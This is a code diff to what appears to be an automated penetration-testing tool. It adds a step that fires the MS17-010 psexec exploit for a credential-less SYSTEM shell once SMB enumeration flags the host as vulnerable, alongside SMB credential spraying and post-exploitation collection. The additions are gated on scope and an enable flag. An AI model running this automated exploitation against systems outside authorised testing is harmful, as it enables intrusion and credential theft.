@@ -20,9 +20,10 @@ from enum_tool import run_enum, run_smb_enum
 from nxc_tool import (nxc_smb_spray, nxc_smb_shares, windows_collection,
                       WINDOWS_POST_COMMANDS)
 from hydra_tool import run_hydra, run_hydra_combo
-from exploit_tool import MODULES
+from exploit_tool import MODULES, WINDOWS_MODULES
 from postexploit_tool import (run_postexploit, parse_collection, POST_COMMANDS,
-                              interactive_exploit, interactive_exploit_windows)
+                              interactive_exploit, interactive_exploit_windows,
+                              run_windows_exploit, interactive_windows_exploit)
 from crack_tool import crack_hashes
 import wordlists
 
@@ -362,6 +363,8 @@ def describe_action(action, target):
         return f"smb_enum {target} (Windows/SMB NSE: os-discovery, signing, shares, sessions, vuln)"
     if kind == "nxc_spray":
         return f"nxc_spray {target} (SMB credential spray: defaults/weak passwords, local auth)"
+    if kind == "win_exploit":
+        return f"win_exploit {as_text(action.get('module')) or '?'} on {target} (credential-less MS17-010 SYSTEM RCE)"
     if kind in TOOLS:
         extras = " ".join(as_text(action.get(p)) for p in TOOLS[kind]["extra_params"])
         return f"{kind} {target} {extras}".strip()
@@ -628,6 +631,13 @@ def decide_next(state):
     if smb_open(services) and not state.get("smb_enum_done"):
         return {"action": "smb_enum", "target": target}
 
+    # Credential-less RCE first: if SMB enumeration flagged MS17-010 as
+    # vulnerable, go straight for a SYSTEM shell (strongest, needs no creds).
+    if (state["exploit_enabled"] and not state.get("shell_opened")
+            and state.get("ms17_010_vuln")
+            and "ms17_010_psexec" not in state["exploited"]):
+        return {"action": "win_exploit", "module": "ms17_010_psexec", "target": target}
+
     # Windows credential attack: once SMB is enumerated, spray default/weak
     # credentials over SMB. Gated on exploit_enabled (it is an active login
     # attack), and only while we have no admin creds / shell yet.
@@ -674,6 +684,7 @@ def run_fast(scope_file, target, max_steps, exploit_enabled, interactive, shell_
         "shell_opened": False,
         "smb_enum_done": False,
         "nxc_spray_done": False,
+        "ms17_010_vuln": False,
     }
     exploits = []
     postexploit = {}
@@ -705,7 +716,34 @@ def run_fast(scope_file, target, max_steps, exploit_enabled, interactive, shell_
                 print("    [!] smb enum refused: target not in scope")
             else:
                 smb_enum_text = summarize_smb_enum(output) or "(no SMB script output)"
+                low = smb_enum_text.lower()
+                if "ms17-010" in low and "vulnerable" in low:
+                    state["ms17_010_vuln"] = True
+                    print("    [!] MS17-010 reported VULNERABLE by NSE")
                 print(f"    > SMB enumeration complete ({len(smb_enum_text.splitlines())} line(s))")
+
+        elif kind == "win_exploit":
+            module_key = action["module"]
+            print(f"    > credential-less exploit {module_key} on {target}")
+            output = run_windows_exploit(target, module_key, scope_file)
+            state["exploited"].add(module_key)
+            if output is None:
+                print("    [!] win_exploit refused (scope) or unknown module")
+            else:
+                outcome = exploit_result(output)
+                exploits.append(f"{module_key} on {target} -> {outcome}")
+                if outcome != "no session":
+                    state["shell_opened"] = True
+                    collected = parse_collection(output)
+                    postexploit.update(collected)
+                    print(f"    [+] {outcome} (SYSTEM)")
+                    if collected:
+                        print(f"    [+] collected {len(collected)} item(s): {', '.join(collected)}")
+                    if shell_enabled and interactive:
+                        print("    > opening interactive SYSTEM shell (msf)...")
+                        interactive_windows_exploit(target, module_key, scope_file)
+                else:
+                    print("    [-] no session (exploit did not land)")
 
         elif kind == "nxc_spray":
             print("    > spraying default/weak SMB credentials (nxc, local auth)")
